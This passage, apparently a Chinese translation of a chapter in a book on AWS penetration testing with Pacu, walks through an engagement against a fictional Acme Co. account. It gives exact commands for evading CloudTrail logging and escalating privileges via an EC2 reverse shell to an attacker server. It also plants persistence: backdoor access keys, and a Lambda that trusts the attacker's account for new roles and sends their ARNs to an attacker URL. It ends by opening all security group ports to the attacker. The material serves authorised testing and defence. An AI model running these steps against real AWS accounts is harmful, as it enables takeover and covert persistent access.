然后，我们将输入我们的密钥。之后，我们可以使用 Python3 启动 Pacu 并创建一个新会话。我们将命名会话为`Acme`，因为这次参与是为 Acme Co。然后，我们可以使用 Pacu 命令`import_keys`将我们的两对密钥从 AWS CLI 导入 Pacu：

```
import_keys PersonalUser
import_keys CompromisedUser
```

我们将我们自己的个人用户添加到 AWS CLI 和 Pacu 中是为了当我们对目标执行未经身份验证的侦察时，因为这些模块通常需要目标账户之外的密钥。

如果客户告诉我们他们只使用特定的一组区域，那么我们也可以使用`set_regions`命令在 Pacu 中设置这一点，但对于我们的情况，我们会说我们还没有这个信息（但愿）。

在这一点上，我们已经准备好进行未经身份验证的（跨账户）侦察。 

# 未经身份验证的侦察

AWS 内的大多数未经身份验证的侦察在技术上并不是未经身份验证的，因为需要凭据。不同之处在于，对于未经身份验证的侦察，我们使用我们自己的攻击者 AWS 密钥，因此我们对目标环境未经身份验证，我们的枚举/尝试的任何日志都将只出现在我们自己的账户中。这在枚举 AWS 资源时几乎是未经身份验证的，除了像开放的 S3 存储桶之类的情况，但即使在这种情况下，某种凭据也可以帮助该过程，因为某些存储桶的权限设置方式。

对于大多数未经身份验证/跨账户攻击来说，了解目标 AWS 账户 ID 是至关重要的。账户 ID 允许我们将资源与我们自己的特定账户关联起来。这意味着我们对 AWS 的第一个 API 调用实际上将来自`CompromisedUser`而不是我们的`PersonalUser`。原因是因为我们还没有账户 ID，我们需要它。幸运的是，已经进行了研究，以获取有关一组密钥的信息，而不记录任何内容到 CloudTrail，就像我们在第十五章中介绍的那样，*Pentesting CloudTrail*。

我们将使用`iam__detect_honeytokens`模块来收集我们需要的信息：

1.  作为`CompromisedUser`，我们将运行 Pacu 命令`run iam__detect_honeytokens`。原因是因为该模块使用一个未记录到 CloudTrail 的 AWS API 调用来枚举当前用户的 ARN，其中包含了账户 ID，我们将在他们不知情的情况下获取了账户 ID。以下屏幕截图显示了在我们的测试环境中运行该模块时的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/69fc7502-0c1d-42e8-ad94-77a9ad9d1c56.png)

iam__detect_honeytokens 模块在不记录到 CloudTrail 的情况下获取我们的 ARN

我们可以看到我们的`CompromisedUser`的用户名是`CompromisedUser`，它位于账户 ID`216825089941`中。如果我们想这样做，我们现在可以运行`whoami`命令来查看这些信息是否已添加到 Pacu 数据库。现在我们有了账户 ID，我们可以开始进行未经身份验证的侦察。这部分未经身份验证的侦察将涉及在账户中枚举 IAM 用户和角色，以及可能与公司或账户关联的 S3 存储桶。

1.  我们将首先注意到我们刚刚枚举的账户 ID，然后通过运行`swap_keys`命令在 Pacu 中将密钥切换到`PersonalUser`来启动它。

1.  作为`PersonalUser`，我们将运行`iam__enum_users`模块，以尝试检测目标账户中的任何用户。我们将向该模块传递我们刚刚获得的账户 ID，以便它知道在哪里查找用户。我们还将向`--role-name`参数传递`Test`作为值，因为我们的个人账户中有一个名为`Test`的角色，并且它是`UpdateAssumeRolePolicy` API 调用所必需的。最终命令将是`run iam__enum_users --role-name Test --account-id 216825089941`。将在您自己账户的 CloudTrail 中创建许多日志，但不会在目标账户中创建。以下屏幕截图显示了该命令的执行，我们可以看到发现了三个独立的 IAM 用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e159c177-da1b-46c5-9261-4f3d2f2051dc.png)

从`iam__enum_users`模块的一些输出中，表明我们在目标账户中发现了三个用户

1.  接下来，我们将使用`iam__enum_roles`模块运行以下命令来执行相同的操作：`run iam__enum_roles --role-name Test --account-id 216825089941`。以下屏幕截图显示了该模块的执行，我们可以看到枚举了四个 IAM 角色：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/fc75780e-4314-4fc5-a152-04aa88362a5d.png)

`iam__enum_roles`模块的部分输出，表明找到了四个角色，但没有一个可以用于凭据

现在，让我们看看我们枚举的用户和角色名称。我们找到了三个用户：

+   `Test`

+   `ExampleUser`

+   `LambdaReadOnlyTest`

`Test`和`ExampleUser`在我们的侦察中并不是很有帮助，但`LambdaReadOnlyTest`表明我们的目标可能在其账户中使用 Lambda 服务。

我们还发现了四个角色：

+   `MyOwnRole`

+   `LambdaEC2FullAccess`

+   `CloudFormationAdmin`

+   `SSM`

这些角色名称比我们枚举的用户更有帮助。`MyOwnRole`有点无用，但`LambdaEC2FullAccess`表明 Lambda 在他们的环境中正在使用，就像我们从一个用户推断出的那样，但这个角色名称还表明了另外两个潜在的可能性：

+   可能存在被启动到 VPC 中的 Lambda 函数，使它们内部访问该网络

+   可能存在直接与 EC2 服务交互的 Lambda，这意味着我们的目标也可能在其环境中使用 EC2 服务

`CloudFormationAdmin`角色表明在环境中可能使用了 CloudFormation，因此在我们开始攻击时，我们需要牢记这一点。它可能能够帮助我们通过少量的 API 调用收集有关目标环境的更多信息。

`SSM`角色表明此角色是为系统管理员创建的。我们可以假设这意味着他们在其环境中使用系统管理员远程控制/管理 EC2 实例或本地服务器。

现在，在目标账户中不创建任何日志的情况下，我们已经枚举了多个存在的用户和角色，并收集了关于他们的基础设施可能如何在不同的 AWS 服务中设置的合理数量的信息。

我们未经身份验证的侦察的最后一部分将是使用 Pacu 的`s3__bucket_finder`模块查看 S3 存储桶。假设我们的目标 Acme Co.拥有域名`acme.com`，因此我们将将其传递给此模块以查找现有的存储桶。我们可以使用以下命令来执行此操作：

```
run s3__bucket_finder -d acme.com
```

输出应该向我们显示是否发现了任何存储桶，然后是否有任何这些存储桶可以列出。不幸的是，我们的扫描没有提供任何可操作的结果，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d855b1c0-0243-44db-bc6a-1a461166d5c3.png)

该模块未找到任何存储桶供我们查看

如前面的截图所示，该模块具有外部依赖性。目前，这是唯一一个使用`install_dependencies`函数的模块，它这样做是为了 Git 克隆`Sublist3r`进行子域变异和`Buckets.txt`进行存储桶暴力破解。因为我们只使用了`-d`参数，所以这两个外部依赖都没有被使用。

现在，我们已经尽了我们在目标账户外的所能。是时候获取`CompromisedUser`凭据并开始我们两部分侦察的经过身份验证的阶段了。

# 经过身份验证的侦察加上权限枚举

要开始我们评估的经过身份验证的侦察部分，我们需要使用`swap_keys` Pacu 命令从我们的`PersonalUser`切换到`CompromisedUser`：

1.  在 Pacu 中运行`swap_keys`以切换到`CompromisedUser`。

1.  经过身份验证的侦察的第一件事是找出我们自己的权限，以便我们知道我们对 AWS 账户有什么样的访问权限。这可以通过使用`iam__enum_permissions` Pacu 模块来完成。对于我们当前的目的，它不需要任何参数，因此我们可以运行以下命令：

```
run iam__enum_permissions
```

1.  接下来，我们可以查看使用`whoami`命令枚举的权限：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/32d75759-9464-4d53-bf88-90d147311bbc.png)

运行`iam__enum_permissions`并使用`whoami`命令检查枚举的数据

我们可以看到我们的用户附加了三个 IAM 策略，其中两个是 AWS 托管策略（`AmazonEC2FullAccess`，`DatabaseAdministrator`），另一个是内联策略（`IAM-Read-List-PassRole`）。我们可以确定这些是 AWS 托管策略，因为在`whoami`命令的结果的`Policies`部分中包含了 ARN。`IAM-Read-List-PassRole`策略没有列出 ARN，这意味着它是一个内联策略，而不是托管策略。

如果我们向下滚动，我们将看到我们的用户被允许/拒绝的权限列表，以及这些权限适用的资源/条件。

现在，我们已经枚举了我们自己的权限，并将其保存到数据库中，我们可以看到我们对 AWS EC2 拥有完全访问权限，`DatabaseAdministrator`策略授予我们的任何访问权限（如果我们愿意，我们可以直接从我们自己的个人账户查看此策略，或者我们可以查看 Pacu 提供的权限列表），以及`IAM-Read-List-PassRole`策略授予我们的任何访问权限（我们可以假设它授予我们对 IAM 服务的读取和列出权限，以及将 IAM 角色传递给其他 AWS 服务/资源的权限）。所有这些都可以通过审查 Pacu 在`whoami`命令中提供的权限列表来确认。

枚举我们自己用户的权限非常重要，但要注意，枚举这些权限可能会触发基于 IAM 枚举的 GuardDuty 警报。然而，我们不仅想要我们自己的权限；我们还想查看账户中每个其他用户和角色的权限，以便为客户提供环境中可能的所有可能的配置错误的完整列表。我们可以使用`iam__enum_users_roles_policies_groups`模块来做到这一点，但这只会枚举每个 IAM 资源的基本信息。我们宁愿再次使用`iam__enum_permissions`模块来收集环境中每个用户/角色的完整权限集。

1.  我们可以通过使用`--all-users`和`--all-roles`参数开始枚举所有用户和角色的权限，可以在以下命令中看到：

```
run iam__enum_permissions --all-users --all-roles
```

现在，Pacu 将循环遍历账户中的每个用户和角色，并将它们的权限转储到我们 Pacu 文件夹中的 JSON 文件中。然后，可以手动审查这些信息，或者将其传递给 Pacu 特权升级模块，以检查所有这些用户/角色的特权升级向量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a51c0c9f-6814-4b90-978b-3bc1950a382b.png)

当针对所有用户和角色时，`iam__enum_permissions`模块的输出

在前面的截图中，我们可以看到 Pacu 尚未枚举目标账户中的用户和角色，因此在执行之前询问我们是否要这样做。然后，我们可以看到它正在将每个用户和角色的权限保存到 Pacu 文件夹中的`sessions/Acme/downloads/confirmed_permissions/`文件夹中。当模块完成时，我们可以检查这些文件，查看这些用户/角色的权限，其格式类似于我们自己用户的`whoami`命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/05c01791-3e2c-4199-99e4-51e20b60544d.png)

JSON 文件中包含 SSM 角色权限的部分内容

枚举的下一步理论上可以等到我们准备攻击特定服务时再进行，但也可以在那之前一次性完成。在这一点上运行的一对很好的模块可能是`aws__enum_account`和`aws__enum_spend`模块，以提供有关用户所在组织和在各种 AWS 服务上花费的资金类型的见解。这些数据可以为您提供信息，让您能够确定正在使用哪些 AWS 服务（以及在多大程度上），而无需查询这些特定的服务本身。例如，如果我们可以看到总账户支出为$1,000.00，EC2 服务的支出为$750.00，那么我们可以假设他们的大部分资源驻留在 EC2 上。您的假设可能并不总是 100%准确，但通常可以提供对预期情况的高层次概述。

1.  现在，在 Pacu 中运行`run aws__enum_account`命令，然后运行`run aws__enum_spend`命令，以接收类似于以下截图所示的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ee18a396-804d-4f9f-b1aa-9273ac45445a.png)

`aws__enum_account`模块的输出和`aws__enum_spend`模块的部分输出

我们可以看到`aws__enum_account`模块为我们提供了美元（$）的总账户支出，为$0.98，但我们未被授权收集有关账户组织的任何信息。我们还可以看到`aws__enum_spend`模块的输出开始部分，该模块正在检查每个 AWS 服务的指标，以确定在其上花费的资金。结果显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/73df535b-f7a0-4862-821a-c50f43762a4a.png)

目标账户的 AWS 账户支出

我们可以看到大部分账户支出出现在 AWS Glue 服务和 Amazon Document DB 服务中，还有一些在 GuardDuty 和 AWS Amplify 中。尽管这些信息很有帮助，但不应该依赖它们作为 100%的事实，因为符合 AWS 免费套餐资格的任何支出都不会在这里记录；这不是账户支出的最新实时清单，也不是所有 AWS 资源都需要花钱。因此，仍然值得直接检查特定服务，但从这个列表开始可能会有所帮助。

1.  通常情况下，我们可以根据`aws__enum_spend`模块返回的数据来制定攻击计划，但在这种情况下，我们的示例公司 Acme Co.在参与之前曾讨论过 EC2。基于这些信息，以及 EC2 通常是最有成效的服务之一，我们将运行`ec2__enum`模块来发现账户中的任何 EC2 资源。我们可以使用以下命令来执行：

```
      run ec2__enum
```

因为我们还没有在 Pacu 中设置任何会话区域，所以我们将被提示并询问是否要针对每个 AWS 区域进行操作，我们会回答是。这是因为我们还不知道使用了哪些区域，所以值得检查每一个，直到我们可以找到这些信息为止：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/cc088745-2b32-4326-8bdc-5d7432f3cf86.png)

`ec2__enum`模块的摘要结果

我们可以看到在扫描中发现了七个 EC2 实例。如果我们在结果中向上滚动，我们可以确定`us-east-1`有一个 EC2 实例，`us-west-2`有六个 EC2 实例。

如果我们想假设整个 AWS 账户只使用`us-east-1`和`us-west-2`，我们可以将 Pacu 会话区域设置为这两个区域，但仅基于单个服务很难做出这样的假设，所以我们不打算这样做。

现在我们已经枚举了存在的 EC2 资源，我们将查看每个实例的`EC2 userdata`，因为这是针对 EC2 实例运行的最简单但最有成效的安全检查之一。通常情况下，我们可以找到私人信息（不应该在其中）或其他一般信息，这些信息可以帮助我们更好地了解环境中发生了什么。

1.  要执行此操作，请在 Pacu 中运行`run ec2__download_userdata`命令。以下屏幕截图显示我们在环境中枚举的两个实例中找到了`userdata`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e648c369-ecae-4f24-9bb2-db244be3b043.png)

使用 ec2__download_userdata 模块的结果

从前面的屏幕截图中可以看到，该模块首先询问我们是否要枚举`EC2 LaunchTemplates`（也可以保存`userdata`），因为数据库中没有，我们回答否，因为我们知道我们已经枚举过了（使用`ec2__enum`），并且没有找到。然后，我们可以看到七个 EC2 实例中有两个附加了`userdata`，然后存储在我们的 Pacu 文件夹中：`./sessions/Acme/downloads/ec2_user_data`。

1.  让我们通过查看这些文件来检查`userdata`，看看其中是否有什么有趣的内容。我们将使用`cat`命令来执行此操作，该命令将输出我们指定的文本文件的内容到屏幕上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2b576881-ad5c-4f0b-b2e0-b97ec0cd4e26.png)

输出这两个包含 EC2 用户数据的文件的内容

根据第一个实例（`i-07fdb3fbb2a9a2444`）的输出，我们可以看到它在启动时使用`apt-get`安装了 AWS CLI，然后使用它将文件从私有 S3 存储桶复制到根文件夹。这告诉我们，该 EC2 实例可能附加了 IAM 角色，因为在`userdata`中没有设置凭据，但我们可以通过 Pacu 中的`data EC2`命令来确认这一点，从中我们可以找到该实例的详细信息。

我们查看的第二个实例的`userdata`看起来很有趣。它正在使用`curl`程序从 Acme.com 的 API 获取授权令牌。它正在使用基本身份验证，因此我们可以在命令中直接看到管理员用户名（`admin`）和密码（`P@ssW0rd`）。现在，我们可以对 Acme.com 网站进行一些简单的侦察，以找出管理员帐户将为我们提供什么访问权限。完成后，我们可以使用相同的凭据和 API 请求我们自己的授权令牌，然后我们可以将访问权限转移到主`Acme.com`网站。

攻击随机的 Web 应用程序超出了本书的范围，但如果满足一些条件，这将是进行 AWS 渗透测试的一个非常有效的攻击路径。首先，Web 应用程序应该托管在我们攻击的 AWS 环境中，才能被视为在范围内，其次，我们需要确定这是否符合客户的期望。如果其中任何一个是有问题的，值得联系我们的客户直接询问。如果允许这种攻击，我们可能能够升级这种攻击以控制 Web 应用程序，或者根据我们在其中找到的内容，我们可能能够进一步扩展我们的 AWS 访问权限。

我们可以在 Pacu 中枚举其他服务和运行其他枚举模块，但现在我们将继续查看特权升级。在我们尝试通过常规手段滥用用户权限进行特权升级之后，将是时候审查账户中的其他服务，并尝试使用这些服务进行特权升级（和/或其他攻击）。

# 特权升级

我们已经枚举了我们自己用户的权限，以及我们正在针对的帐户中的每个其他用户和角色的权限。现在我们可以将`iam__enum_permissions`模块生成的信息传递给`iam__privesc_scan`模块，以检查帐户内是否存在特权升级的情况。我们首先使用`--offline`参数，以便模块知道我们正在检查每个人的特权升级路径。如果没有该参数，它将只检查我们自己用户的特权升级路径，然后尝试利用它们以获得对环境的提升访问权限。以下截图显示了`iam__privesc_scan`模块的输出，其中它已经确定了多个用户已经具有对环境的管理员特权，并且多个用户容易受到几种不同特权升级的攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d8ebcfaf-d238-4c27-8b9d-6dff0c983229.png)

使用--offline 参数运行 iam__privesc_scan 模块

我们可以从这个输出中得出一些结论。我们可以看到用户`Spencer`，`DaveY`，`ExampleUser`和`Alex`以及角色`EC2Admin`和`CloudFormationAdmin`都已经具有对环境的管理员访问权限。之后，我们可以看到角色`AWSBatchServiceRole`，`AWSServiceRoleForAutoScaling`和`aws-elasticbeanstalk-service-role`以及用户`CompromisedUser`可能容易受到各种特权升级方法的攻击。

好消息是我们自己的用户`CompromisedUser`可能容易受到四种不同的升级方法的攻击，这意味着我们很可能能够进一步访问环境。如果我们想以后再次查看这些数据，我们可以导航到 Pacu `./sessions/Acme/downloads/`文件夹，以查看生成的 JSON 文件，其中存储了特权升级数据，如模块输出底部所示。当我们完成渗透测试（在验证特权升级扫描结果后），我们将要确保将这些信息报告给客户，即使我们自己的用户并非直接易受攻击。

特权升级扫描的结果旨在通过它们的名称自我解释，但如果您对每种特权升级方法的具体情况感兴趣，建议您查看此链接：[`rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/`](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)。该模块是围绕该博客文章的内容构建的，因此您可以将特权升级方法与博客文章中解释的手动指南进行匹配。

如果我们查看我们的`CompromisedUser`易受攻击的`privesc`方法，它告诉我们它可能容易受到四种不同方法的攻击。`CreateEC2WithExistingIP`方法意味着我们可能有权限启动新的 EC2 实例并将现有实例配置文件传递给它，然后我们将能够访问与实例配置文件关联的 IAM 角色凭据。`"PassExistingRoleToNewLambdaThenTriggerWithNewDynamo"`和`"PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo"` `privesc`方法意味着我们可能有权限创建新的 Lambda 函数，传递 IAM 角色，然后通过新的或现有的 DynamoDB 事件源映射调用该函数。

`PassExistingRoleToNewDataPipeline`方法告诉我们，我们可能有权限启动新的数据管道以执行 AWS CLI，就像我们传递的角色一样。我们可以手动查看这些方法中的每一个，以尝试获得更多的访问权限，但使用`iam__privesc_scan`模块的利用功能将更加高效，它将自动尝试使用可用方法提升我们用户的权限。

要自动利用特权升级方法，我们只需运行以下命令：

```
run iam__privesc_scan
```

然后，它将自动找到我们用户的脆弱的`privesc`方法，并循环遍历每一个，直到成功获得额外的权限。由于某些特权升级方法的复杂性，可能需要在各个点输入用户输入。当我们第一次运行它时，它将再次找到那些特权升级方法，然后深入到`CreateEC2WithExistingIP`特权升级方法中，可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7c3fa2a1-417c-4e45-b674-be63bd6c6b96.png)

privesc 扫描模块尝试通过第一种方法获得特权

它正在要求一个区域，因为我们还没有为 Pacu 会话设置任何会话区域，所以我们将提供`15`来定位`us-west-2`区域：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4a484c89-9fec-4752-8d8e-ee56d6d0c96d.png)

EC2 特权升级方法希望我们选择要附加到实例的实例配置文件

正如我们在前面的截图中所看到的，有六个 EC2 实例配置文件有资格附加到我们的实例。我们想选择具有最高权限的那个，因为这是我们通过这种方法获得访问权限的角色。我们可以通过查看之前的完整账户`iam__enum_permissions`模块的输出来确定这些信息，但是如果我们回顾一分钟前的完整账户特权升级扫描，我们将看到它告诉我们`EC2Admin`角色已经具有管理员权限。这使得这个问题的选择变得显而易见：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3ce2c35e-3aa9-48fa-b0c3-911896cb3d39.png)

在选择实例配置文件后，我们被问到的下一个问题

接下来，我们将被提出一个问题，并提供五个选项供选择。问题是问我们如何使用这个 EC2 实例来提升我们的权限。选项一是在启动时向我们自己的服务器打开一个反向 shell，允许我们在实例内部做我们想做的事情。选项二是从目标实例内部运行 AWS CLI 命令，使用我们附加到实例的角色凭据。选项三是从 EC2 实例向我们自己的服务器发出包含 IAM 角色当前凭据的 HTTP 请求。选项四是在 AWS 中创建一个新的 SSH 密钥，提供给您私钥，然后使用该密钥启动实例，以允许您 SSH 进入它。最后，选项五是跳过这个`privesc`方法，转移到下一个。根据您的个人设置和环境的设置，您将不得不选择最适合您的方法。

对于这次渗透测试，我将选择选项一，即反向 shell，因为它不会触发 GuardDuty，而且只需要默认的 EC2 安全组允许我们指定的端口的出站互联网访问（而不是像选项四那样需要入站端口`22`）。从反向 shell，我们可以在实例内部使用 AWS CLI，从 EC2 元数据 API 中获取角色凭据，或者任何其他我们想要的东西：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f13b4a0d-1263-4662-b7fb-e04ac5bcda56.png)

使用反向 shell 选项进行特权升级方法

在上一张截图中，我们可以看到我们提供了攻击者拥有的服务器的 IP 地址（已屏蔽）和端口。然后，该模块输出了它创建的 EC2 实例的详细信息。现在，我们所需要做的就是等待我们的反向 shell 出现：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4489248c-f671-4774-acbc-9d5da94e14b8.png)

设置我们的 netcat 监听器，在那里我们接收我们的反向 shell 作为 root 用户

正如我们在前面的截图中所看到的，我们使用 netcat 监听端口`5050`，运行`whoami`命令以查看我们是 root 用户，然后使用 AWS CLI 运行`STS GetCallerIdentity`命令。该命令的输出显示我们正在作为假定角色`EC2Admin`进行 AWS 身份验证，我们知道该角色对环境拥有完整的管理员权限。

尽管我们在 AWS 环境中有管理员权限，但这只是暂时的。我们可能随时失去这个 EC2 实例，或者凭据在我们能够对其进行有用操作之前就会过期，因此我们需要迅速采取行动，提升我们原始的`CompromisedUser`权限并将 EC2 实例保存为备份。基本上，一旦我们提升了自己用户的权限，EC2 实例将作为账户中的伪持久性，有可能在将来再次获得管理员级别权限。

为了将我们自己的用户提升为管理员，我们将运行以下 AWS CLI 命令，将`AdministratorAccess` AWS 托管的 IAM 策略附加到我们的`CompromisedUser`：

```
aws iam attach-user-policy --user-name CompromisedUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

如果成功，该命令不会返回任何输出，因此我们可以再次回到`iam__enum_permissions` Pacu 模块，以确认我们是管理员：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0327c5a5-f797-4cb3-8567-a49eeb52da60.png)

重新运行 iam__enum_permissions，然后运行 whoami，并查看我们是否附加了 AdministratorAccess IAM 策略

如果我们想进一步确认，我们可以尝试运行一个我们之前没有访问权限的 AWS CLI 命令或 Pacu 模块，但我们的用户附加的策略表明我们实际上是管理员。

到目前为止，我们已经枚举了 IAM 和 EC2 数据，启动了一个后门 EC2 实例以允许特权升级，然后使用 EC2 实例将我们的`CompromisedUser`提升为环境中的管理员。在这一点上，我们应该在继续使用其他 AWS 服务之前建立一些持久性。

# 持久性

尽管我们已经有一个我们可以访问的 EC2 实例，并且可以在环境中提供给我们管理员级别角色的访问权限，但出于几个原因，我们不应该仅依赖它作为我们唯一的持久性方法。角色随时可能发生变化，例如如果被删除或者其权限被修改，这将移除或削弱我们的持久性访问。

EC2 实例随时可能被标记为可疑并关闭，移除我们的持久性访问。此外，EC2 安全组规则可能被修改，阻止实例的出站访问，这意味着我们将不再接收到反向 shell。最后，我们可能会失去反向 shell 连接，这意味着我们需要等待实例重新启动才能再次获得反向 shell 连接。即使没有防御者试图阻止我们，事情也可能出错很多种方式，因此附加角色的 EC2 实例并不是一个可靠的持久性方法，尽管它至少在短时间内有效。

为了彻底/安全起见，我们将在目标帐户中启动几种不同的持久性方法：

1.  我们将使用的第一种持久性方法是使用`iam__backdoor_users_keys` Pacu 模块为帐户中的另一个或两个用户创建新的访问密钥对，通过运行`run iam__backdoor_users_keys`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/06b1140c-7a0e-4032-b2f0-e8173562ad4b.png)

使用`iam__backdoor_users_keys`模块为 DaveY 和 Spencer 用户设置后门

正如我们在前面的截图中所看到的，该模块将提示我们，询问我们想要为哪些用户创建后门 AWS 密钥。

1.  我们选择了`DaveY`和`Spencer`作为示例，因为当我们之前运行特权升级扫描程序时，他们显示为管理员用户，这意味着只要这些密钥存活，我们将具有提升的持久性。

1.  接下来，我们将在帐户中创建一个新的 Lambda 后门，以便后门任何新创建的 IAM 角色，以便我们可以跨帐户假定其凭据。我们可以使用`lambda__backdoor_new_roles` Pacu 模块来实现这一点。我们需要一个具有 IAM `UpdateAssumeRolePolicy`和`GetRole`权限的角色，以便我们的后门，因此我们将将该权限添加到允许 Lambda 被假定的现有角色。我们可以通过运行以下命令使用 AWS CLI 来实现这一点，该命令针对`LambdaEC2FullAccess`角色：

```
aws iam put-role-policy --role-name LambdaEC2FullAccess --policy-name UARP --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": ["iam:UpdateAssumeRolePolicy", "iam:GetRole"], "Resource": "*"}]}'

```

1.  还有一件事要做。该模块告诉我们，CloudTrail 必须在`us-east-1`地区启用我们的后门功能才能触发，因此我们应该再次检查一下，以防万一。以下命令可以满足我们的要求：

```
aws cloudtrail describe-trails --region us-east-1
```

在我们的情况下，有一个位于`us-east-1`的角色，因此我们可以使用后门模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8d10fd48-2301-4683-b3ff-4518b5285398.png)

创建一个后门 Lambda 函数和 CloudWatch Events 规则

正如我们在前一个屏幕截图中看到的，我们运行了以下 Pacu 命令：

```
run lambda__backdoor_new_roles --exfil-url http://x.x.x.x:5050/ --arn arn:aws:iam::000000000000:user/PersonalUser
```

该命令假定我们在 IP `x.x.x.x`（已编辑）的端口`5050`上托管了 HTTP 监听器，并且我们的`PersonalUser` AWS 用户驻留在 AWS 帐户 ID`000000000000`中。运行时，Pacu 将为 Lambda 函数生成代码，对其进行压缩，然后将其上传到 Lambda。之后，它将创建一个 CloudWatch Events 规则，该规则会触发任何 IAM `CreateRole` API 调用。现在，每当创建新的 IAM 角色时，我们的 CloudWatch Events 规则将被触发，这将导致我们的 Lambda 函数被调用，然后将使用 IAM `UpdateAssumeRolePolicy` API 将我们的外部用户（`PersonalUser`）添加为可以假定的受信任实体。完成后，它将将新角色的 ARN 外泄到我们在命令中提供的 URL，以便我们随时可以使用它来访问帐户。

等待片刻后，我们最终收到了一个 IAM 角色 ARN 的请求，这意味着已经创建了一个角色，并且我们使用我们的 Lambda 函数自动设置了后门：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e6df982c-0623-4e60-9838-ec3d44e784a6.png)

我们自己的服务器在端口 5050 上监听来自我们后门 Lambda 函数的 IAM 角色 ARN

正如我们在前面的屏幕截图中看到的，我们的服务器收到了一个`HTTP` `POST`请求，其中包含一个 URL 编码的 IAM 角色 ARN（名为`A-New-Role`）。

如果我们想要请求此后门角色的凭据，我们将使用 STS `AssumeRole` API。我们可以通过运行以下 AWS CLI 命令，使用我们的`PersonalUser`的凭据来实现这一点：

```
aws sts assume-role --role-session-name Backdoor --role-arn arn:aws:iam::216825089941:role/A-New-Role
```

我们可以使用相同的命令来处理任何其他最终被创建并外泄到我们服务器的角色；我们只需要修改其中的 ARN。

现在我们是帐户中的管理员，我们有几种提升的持久性形式，并且我们还在帐户中执行了一些基本的侦察。现在，我们准备进入服务利用阶段。

# 后利用

后利用（或服务利用）阶段基本上是我们尽可能地针对 AWS 服务，以尝试发现弱点、错误配置和不良实践。我们将在本节中介绍一些主要的 AWS 服务，但任何 AWS 服务都有可能被利用和错误配置，因此查看任何正在使用的服务或资源几乎总是值得的，即使您可能对该服务本身不熟悉。

# EC2 利用

我们已经开始处理一些与 EC2 相关的内容，因此我们将从这里开始。EC2 也是您在渗透测试中经常遇到的服务之一，因此熟悉它并进行测试是一个好主意。当错误配置时，EC2 也可能产生一些高影响的发现，因此以它作为您的主要服务开始是没有错的。

我们可以首先检查有哪些 EC2 实例具有公共 IP 地址。在 AWS Web 控制台中，这很简单，因为您可以通过实例的公共 IP 地址对结果进行排序。如果我们想要从我们的`CompromisedUser`获得控制台访问权限，我们可以使用 IAM 的`CreateLoginProfile` API 为我们创建一个登录密码，但如果我们不想这样做，我们可以使用 Pacu 中的`data EC2`命令来查看我们之前执行的枚举的结果。

然后，对于每个具有公共 IP 地址的实例，我们可以查看附加到它们的 EC2 安全组。理想情况下，我们可以浏览安全组规则，尝试找到可能在实例上运行的任何服务。如果我们看到端口 80 对某个 IP 地址开放，我们知道该实例上可能正在运行 Web 服务器。如果我们看到端口 22 对某个 IP 地址开放，我们知道该实例上可能正在运行 SSH 服务器（等等）。如果其中任何端口对公共开放，我们可以尝试访问这些端口，并寻找任何低 hanging-fruit，例如弱/缺乏身份验证，已知的漏洞，或者您在网络风格渗透测试中可能寻找的其他任何内容。

如果满足了正确的条件，我们甚至可以在没有公共 IP 地址的实例上执行相同的任务，但是有管理员访问权限，我们可能可以使任何事情都能够运行。我们已经在账户中启动了一个 EC2 实例，用于特权升级，所以我们可能在其他 EC2 实例的 VPC 内。如果不是这样，我们可以启动另一个实例并以这种方式获得访问权限。从那个实例，我们可以访问其他 EC2 实例的内部 IP，所以我们可能可以通过这种方式获得进一步的访问权限。

如果这些都不起作用，我们可以修改这些实例的安全组规则，以允许我们访问。您可以使用 EC2 的`AuthorizeSecurityGroupIngress` API 手动执行此操作，或者我们可以使用`ec2__backdoor_ec2_sec_groups`模块创建允许我们访问任何端口的后门规则。使这一切发生的 Pacu 命令如下，我们正在为所有安全组向`1.1.1.1` IP 地址（模拟为我们自己的 IP）打开每个端口：

```
run ec2__backdoor_ec2_sec_groups --port-range 1-65535 --protocol TCP --ip 1.1.1.1/32
```

